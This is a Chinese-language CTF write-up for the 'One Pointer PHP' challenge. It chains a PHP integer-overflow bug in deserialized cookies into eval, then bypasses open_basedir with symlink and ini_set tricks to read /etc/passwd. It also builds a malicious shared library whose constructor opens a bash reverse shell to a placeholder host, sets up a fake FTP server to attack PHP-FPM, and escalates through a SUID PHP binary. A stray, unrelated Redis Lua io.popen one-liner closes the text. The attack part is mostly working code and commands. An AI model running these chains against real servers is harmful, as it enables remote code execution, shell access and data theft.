```php
user.php:
<?php
class User{
	public $count;
}
?>

add_api.php:
<?php
include "user.php";
if($user=unserialize($_COOKIE["data"])){
	$count[++$user->count]=1;
	if($count[]=1){
		$user->count+=1;
		setcookie("data",serialize($user));
	}else{
		eval($_GET["backdoor"]);
	}
}else{
	$user=new User;
	$user->count=1;
	setcookie("data",serialize($user));
}
?>
```

以上为题目源码，其中`if($count[]=1)`是判断1是否能追加到$count数组最后一个中

考虑到只有php数组溢出才能让数组无法追加



**数组溢出**

> 索引数组最大下标等于最大int数，对其追加会导致整型数溢出，进而引起追加失败

即32位最大是231-1，64位是263-1

也就是2147483647与9223372036854775807

```php
<?php
class User{
	public $count;
}
$a=new User();
$a->count=9223372036854775806;
echo urlencode(serialize($a));
?>
data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
```



**open_basedir绕过**

用phpinfo()成功验证绕过，但是无法直接命令执行，查看phpinfo

```
disable_functions	中有system、passthru、exec、shell等一系列执行函数

open_basedir	/var/www/html	/var/www/html  用于指定基于目录的访问限制
```

先用glob://伪协议（查找匹配的文件路径模式）绕过：

```
basckdoor=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
```

得到flag在根目录下，现在需要绕过open_basedir读取文件

```
mkdir("c");
chdir("c");
mkdir("d");
chdir("d");
chdir("..");
chdir("..");
symlink("c/d","tmplink");
symlink("tmplink/../../../../../../ctfshowflag","exploit");
unlink("tmplink");
mkdir("tmplink");
echo file_get_contents("exploit");

mkdir("s");
chdir('s');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
echo file_get_contents("etc/passwd");
```



/proc/self/cmdline内容为

```
php-fpm: pool www 
```

/proc/self/maps内容为

```
7fc77dffe000-7fc77dfff000 r--p 00001000 fc:11 569495661                  /usr/local/lib/php/extensions/no-debug-non-zts-20190902/easy_bypass.so
7fc77dfff000-7fc77e000000 rw-p 00002000 fc:11 569495661                  /usr/local/lib/php/extensions/no-debug-non-zts-20190902/easy_bypass.so
```

/usr/local/etc/php-fpm.d/www.conf内容为

```
; The address on which to accept FastCGI requests.
; Valid syntaxes are:
;   'ip.add.re.ss:port'    - to listen on a TCP socket to a specific IPv4 address on
;                            a specific port;
;   '[ip:6:addr:ess]:port' - to listen on a TCP socket to a specific IPv6 address on
;                            a specific port;
;   'port'                 - to listen on a TCP socket to all addresses
;                            (IPv6 and IPv4-mapped) on a specific port;
;   '/path/to/unix/socket' - to listen on a unix socket.
; Note: This value is mandatory.
listen = 127.0.0.1:9001
```

知道了php-fpm监听127.0.0.1:9001



**disable_functions绕过（PHP-fpm攻击）**

编辑一个扩展so文件

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i >& /dev/tcp/x.x.x.x/xxxx 0>&1'");
}
```

编译为so文件（一种共享库文件，也被称为动态链接库或共享对象文件，可以包含编译后的可执行代码，通常包括函数和数据，可以被多个程序共享和重复使用）

```
gcc hpdoger.c -fPIC -shared -o hpdoger.so
```

将hpdoger.so上传到/tmp/目录下



在自己的服务器上用python来伪造ftp服务

```php
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 10023))#伪造ftp的端口
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

同时用`nc -lvp xxxx`（这里端口为上面恶意so文件反弹shell的端口）来监听



然后用一个php脚本[Personal_Notes/resources/fpm.php at main · lightpig7/Personal_Notes · GitHub](https://github.com/lightpig7/Personal_Notes/blob/main/resources/fpm.php)生成data（其实就是伪造fastcgi协议发送给PHP-FPM，将`extension`设置为`hpdoger.so`，用于扩展PHP的功能，指示PHP-FPM加载名为`hpdoger.so`的扩展，即我们的恶意文件。还修改了PHP的配置和行为，例如令disable_functions为空等等，但是这些配置选项将在 FastCGI 应用程序执行当前请求时生效，但不会永久更改 PHP 的全局配置）



然后传参用file_put_contents()函数来使服务器进行ftp请求

```
add_api.php?backdoor=phpinfo();file_put_contents($_GET[%27file%27],$_GET[%27data%27]);&file=ftp://aaa@x.xx.xx.x:x/1&data=%01%01%00%0

这里的ftp端口为服务器上伪造ftp的端口
```



**suid提权**

```
find / -perm -u=s -type f 2>/dev/null 先找到suid权限的程序
```

```
发现/usr/local/bin/php有suid权限

然后
php -a

然后mkdir('d');chdir('d');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/flag'));
```



参考博客：[[蓝帽杯 2021\]One Pointer PHP_L1s4的博客-CSDN博客](https://blog.csdn.net/baidu_39504221/article/details/116720875)

​					[php绕过open_basedir_php5全版本绕过open_basedir读文件脚本-CSDN博客](https://blog.csdn.net/weixin_54648419/article/details/123683025)

		eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0




